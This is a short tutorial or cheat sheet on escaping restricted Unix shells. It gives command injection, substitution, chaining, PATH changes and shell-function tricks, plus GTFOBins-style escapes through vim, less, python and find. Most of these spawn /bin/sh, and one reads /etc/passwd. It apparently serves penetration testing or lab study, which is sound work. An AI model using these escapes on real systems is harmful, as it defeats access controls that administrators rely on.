
## Overview
A restricted shell limits a user's ability to execute commands, change directories, or modify environment variables. Escaping involves finding "leaks" in the shell's command parsing or using allowed binaries to launch an unrestricted environment.

---

## 1. Command Injection (via Arguments)
If the shell allows certain commands (like `ls` or `echo`), you can inject forbidden commands into the argument field using backticks (`` ` ``) or `$()`.
* **Mechanism**: The shell evaluates the inner command first and passes the output to the primary command.
* **Example**: `ls -l $(whoami)`
* **Escape Attempt**: `ls -l $(sh)`

---

## 2. Command Substitution
This technique uses the shell's substitution syntax to execute a command that is not explicitly restricted.
* **Syntax**: `` `command` `` or `$(command)`
* **Example**: If `cat` is blocked but `` `cat /etc/passwd` `` is executed within an allowed command's argument, the shell may bypass the restriction.

---

## 3. Command Chaining
Metacharacters can be used to execute multiple commands in a single line, potentially bypassing filters that only validate the first word of the input.
* **Operators**: `;` (Semicolon), `|` (Vertical Bar/Pipe), `&&` (AND), `||` (OR).
* **Example**: `ls -a ; /bin/sh`

---

## 4. Environment Variables
If the shell allows modifying or creating environment variables (via `export` or `set`), you can change how the shell executes commands.
* **Technique**: Modifying the `$PATH` variable to include directories containing unrestricted binaries, or changing the `$SHELL` variable to point to `/bin/bash`.
* **Example**: `export PATH=/usr/local/bin:/usr/bin:/bin`

---

## 5. Shell Functions
If the shell allows the definition and calling of functions, you can wrap a restricted command inside a custom function.
* **Example**:
    ```bash
    function bypass { /bin/sh; }
    bypass
    ```
* **Why it works**: Simple filters often scan the command line for specific keywords but may fail to inspect the logic defined inside a user-created function.

---

## Common Binary Jailbreaks (GTFOBins)
If these binaries are available in your restricted environment, use these escapes:

* **Vim**: `:!/bin/sh`
* **Less / More / Man**: `!/bin/sh`
* **Python**: `python -c 'import os; os.system("/bin/sh")'`
* **Find**: `find . -exec /bin/sh \; -quit`
